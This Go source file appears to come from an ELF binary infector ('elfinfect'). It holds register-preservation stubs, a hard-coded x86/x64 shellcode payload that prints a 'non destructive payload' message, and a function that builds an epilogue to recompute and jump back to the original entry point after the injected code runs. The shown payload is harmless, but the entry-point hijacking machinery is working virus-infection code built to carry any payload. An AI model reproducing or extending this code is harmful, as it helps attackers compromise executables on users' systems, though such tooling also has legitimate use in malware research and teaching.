package elfinfect

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"math/bits"
)

var preserve64 = []byte{
	0x54,       //push   %rsp
	0x50,       //push   %rax
	0x51,       //push   %rcx
	0x53,       //push   %rbx
	0x52,       //push   %rdx
	0x56,       //push   %rsi
	0x57,       //push   %rdi
	0x55,       //push   %rbp
	0x41, 0x50, //push   %r8
	0x41, 0x51, //push   %r9
	0x41, 0x52, //push   %r10
	0x41, 0x53, //push   %r11
	0x41, 0x54, //push   %r12
	0x41, 0x55, //push   %r13
	0x41, 0x56, //push   %r14
	0x41, 0x57, //push   %r15
}

var restoration64 = []byte{
	0x41, 0x5f, //pop    %r15
	0x41, 0x5e, //pop    %r14
	0x41, 0x5d, //pop    %r13
	0x41, 0x5c, //pop    %r12
	0x41, 0x5b, //pop    %r11
	0x41, 0x5a, //pop    %r10
	0x41, 0x59, //pop    %r9
	0x41, 0x58, //pop    %r8
	0x5d, //pop    %rbp
	0x5f, //pop    %rdi
	0x5e, //pop    %rsi
	0x5a, //pop    %rdx
	0x5b, //pop    %rbx
	0x59, //pop    %rcx
	0x58, //pop    %rax
	0x5c, //pop    %rsp
}

var preserve32 = []byte{0x60} //pusha

var restoration32 = []byte{0x61} //popa

func (p DefaultPayload) Intel64() []byte {
	p.payload64.Write([]byte{
		0xeb, 0x00, //jmp    401005 <message>
		//0000000000401005 <message>:
		0xe8, 0x2b, 0x00, 0x00, 0x00, //call   401035 <shellcode>
		0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
		0x20, 0x2d, 0x2d, 0x20, 0x74, 0x68, //and    %ch,0x6874202d(%rip)        # 68b43042 <__bss_start+0x68741042>
		0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%rbx),%esi
		0x20, 0x6e, 0x6f, //and    %ch,0x6f(%rsi)
		0x6e,                   //outsb  %ds:(%rsi),(%dx)
		0x20, 0x64, 0x65, 0x73, //and    %ah,0x73(%rbp,%riz,2)
		0x74, 0x72, //je     401098 <get_eip+0x37>
		0x75, 0x63, //jne    40108b <get_eip+0x2a>
		0x74, 0x69, //je     401093 <get_eip+0x32>
		0x76, 0x65, //jbe    401091 <get_eip+0x30>
		0x20, 0x70, 0x61, //and    %dh,0x61(%rax)
		0x79, 0x6c, //jns    40109d <get_eip+0x3c>
		0x6f,       //outsl  %ds:(%rsi),(%dx)
		0x61,       //(bad)
		0x64, 0x0a, //or     %fs:0x1(%rax),%bh

		//0000000000401035 <shellcode>:
		0xb8, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%eax
		0xbf, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%edi
		0x5e,                         //pop    %rsi
		0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
		0x0f, 0x05, //syscall
	})

	return p.payload64.Bytes()
}

func (p DefaultPayload) Intel32() []byte {
	p.payload32.Write([]byte{
		0xeb, 0x00, //jmp    8049002 <message>
		//08049002 <message>:
		0xe8, 0x2b, 0x00, 0x00, 0x00, //call   8049032 <shellcode>
		0x68, 0x65, 0x6c, 0x6c, 0x6f, //push   $0x6f6c6c65
		0x20, 0x2d, 0x2d, 0x20, 0x74, 68, //and    %ch,0x6874202d
		0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, //imul   $0x61207369,0x20(%ebx),%esi
		0x20, 0x6e, 0x6f, //and    %ch,0x6f(%esi)
		0x6e,                         //outsb  %ds:(%esi),(%dx)
		0x2d, 0x64, 0x65, 0x73, 0x74, //sub    $0x74736564,%eax
		0x72, 0x75, //jb     8049099 <shellcode+0x67>
		0x63, 0x74, 0x69, 0x76, //arpl   %si,0x76(%ecx,%ebp,2)
		0x65, 0x20, 0x70, 0x61, //and    %dh,%gs:0x61(%eax)
		0x79, 0x6c, //jns    804909a <shellcode+0x68>
		0x6f, //outsl  %ds:(%esi),(%dx)
		0x61, //popa
		0x64, //fs
		0x0a, //.byte 0xa
		//08049032 <shellcode>:
		0x59,                         //pop    %ecx
		0xbb, 0x01, 0x00, 0x00, 0x00, //mov    $0x1,%ebx
		0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
		0xb8, 0x04, 0x00, 0x00, 0x00, //mov    $0x4,%eax
		0xcd, 0x80, //int    $0x80
	})

	return p.payload32.Bytes()
}

func (t *TargetBin) WritePreservationStub() {
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		t.Payload.Write(preserve64)
	case elf.ELFCLASS32:
		t.Payload.Write(preserve32)
	}
}

/*
x64 - pEntry uint64 / oEntry uint64
x86 - pEntry uint32 / oEntry uint32
*/
func modEpilogue(pSize int32, pEntry interface{}, oEntry interface{}) []byte {
	//account for the call instruction we will prepend to the shellcode
	pSize += 5

	//if need be, adjust pSize to a value that doesn't have signed bit set
	//mov rax, <imm> causes signed bit extension for values with a signed bit,
	//this is a hack for dealing with it.
	aPsize := adjustPsize(pSize)

	encPsize := make([]byte, 4)
	binary.LittleEndian.PutUint32(encPsize, uint32(aPsize))

	var shellcode bytes.Buffer

	if aPsize != pSize {
		var nopCount int
		for nopCount = 0; signedInt32(pSize); pSize++ {
			nopCount++
		}

		for i := 0; i < nopCount; i++ {
			shellcode.Write([]byte{0x90})
		}
	}

	// (x64) - sub rax, encPsize
	// (x86) - sub eax, encPsize

	switch oEntry.(type) {
	case uint64:
		shellcode.Write([]byte{0x48, 0x2d})
	case uint32:
		shellcode.Write([]byte{0x2d})
	}

	shellcode.Write(encPsize)

	//	(x64) - sub rax, pEntry
	//	(x86) - sub eax, pEntry

	encPentry := make([]byte, 4)
	switch v := pEntry.(type) {
	case uint64:
		binary.LittleEndian.PutUint32(encPentry, uint32(v))
		shellcode.Write([]byte{0x48, 0x2d})
	case uint32:
		binary.LittleEndian.PutUint32(encPentry, v)
		shellcode.Write([]byte{0x2d})
	}

	shellcode.Write(encPentry)

	// (x64) - add rax, oEntry
	// (x86) - add eax, oEntry

	encOentry := make([]byte, 4)
	switch v := oEntry.(type) {
	case uint64:
		binary.LittleEndian.PutUint32(encOentry, uint32(v))
		shellcode.Write([]byte{0x48, 0x05})
	case uint32:
		binary.LittleEndian.PutUint32(encOentry, v)
		shellcode.Write([]byte{0x05})
	}

	shellcode.Write(encOentry)

	switch oEntry.(type) {
	case uint64:
		/* --- write -- */
		//jmp rax
		//mov rax, [rsp]
		//ret
		shellcode.Write([]byte{0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3})
	case uint32:
		/* --- write -- */
		//jmp eax
		//mov eax, [esp]
		//ret
		shellcode.Write([]byte{0xff, 0xe0, 0x8b, 0x04, 0x24, 0xc3})
	}

	jmpRaxOffset := bytes.LastIndexByte(shellcode.Bytes(), 0xff)

	// mov [accumulator register] , [stack-pointer] will be two bytes after jmp [accumulator] instruction
	getIPOff := jmpRaxOffset + 2
	encOff := make([]byte, 4)

	var callInst bytes.Buffer

	//call instruction opcode
	callInst.Write([]byte{0xe8})
	//offset to get_eip
	binary.LittleEndian.PutUint32(encOff, uint32(getIPOff))
	callInst.Write(encOff)

	//place the call as the first instruction of the shellcode
	return append(callInst.Bytes(), shellcode.Bytes()...)
}

func adjustPsize(pSize int32) int32 {
	for {
		if !signedInt32(pSize) {
			break
		}
		pSize++
	}
	return pSize
}

func signedInt32(n int32) bool {
	switch getNoneZeroByteCount(n) {
	case 1:
		return (n & (int32(1) << 23)) == (int32(1) << 23)
	case 2:
		return (n & (int32(1) << 15)) == int32(1)<<15
	case 3:
		return (n & (int32(1) << 7)) == int32(1)<<7
	}
	return false
}

func getNoneZeroByteCount(n int32) (nonZeros int) {
	numZeros := bits.LeadingZeros32(uint32(n))
	zeroBytes := numZeros / 8
	nonZeros = 4 - zeroBytes
	return
}
